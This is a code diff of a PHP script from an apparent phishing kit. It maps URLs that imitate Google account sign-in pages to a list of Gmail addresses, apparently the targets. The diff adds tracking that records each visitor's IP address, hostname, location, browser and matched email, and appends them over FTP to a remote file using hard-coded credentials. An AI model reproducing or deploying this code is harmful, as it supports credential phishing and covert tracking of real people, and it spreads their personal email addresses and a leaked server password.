@@ -1,5 +1,7 @@
 <?php
-$vinculo = $_SERVER['HTTP_REFERER'];
+$vinculo = $_GET['$vinculo'];
+
+
 $url = array(
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?00",
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?01",
@@ -41,6 +43,9 @@ $url = array(
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?37",
 "https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?38"
 );
+
+
+
 $correo = array(
 "rojo.alac@gmail.com",
 "elvisrodriguezs94@gmail.com",
@@ -82,6 +87,8 @@ $correo = array(
 "rafaelq.sistemas@gmail.com",
 "jo.25el.26@gmail.com"
 );
+
+
 $vinculo = str_replace($url[0], $correo[0], $vinculo);
 $vinculo = str_replace($url[1], $correo[1], $vinculo);
 $vinculo = str_replace($url[2], $correo[2], $vinculo);
@@ -121,6 +128,7 @@ $vinculo = str_replace($url[35], $correo[35], $vinculo);
 $vinculo = str_replace($url[36], $correo[36], $vinculo);
 $vinculo = str_replace($url[37], $correo[37], $vinculo);
 $vinculo = str_replace($url[38], $correo[38], $vinculo);
+
 date_default_timezone_set('America/Caracas');
 @ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
 @ $hostname=gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -129,7 +137,6 @@ $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $hostname = gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
 $navegador = $_SERVER['HTTP_USER_AGENT'];
-$correo = $_GET['correo'];
 $time = time();
 $f = fopen("ftp://openresults:qwertyuiop@files.000webhost.com/public_html/1/mail.html", "a");
 fwrite ($f, '<font color="#A4A4A4">Direccion IP </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$ip.'</font><br>');
@@ -141,7 +148,7 @@ fwrite ($f, '<font color="#A4A4A4">Ciudad </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 fwrite ($f, '<font color="#A4A4A4">Estado </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->region.'</font><br>');
 fwrite ($f, '<font color="#A4A4A4">Pais </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->country.'</font><br>');
 fwrite ($f, '<font color="#A4A4A4">Fecha </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.date("D dS M, Y h:i a").'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$correo.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$vinculo.'</font><br>');
 fwrite ($f, '<font color="#A4A4A4"><br><br><hr><br><br>');
 fclose($f);
 exit;
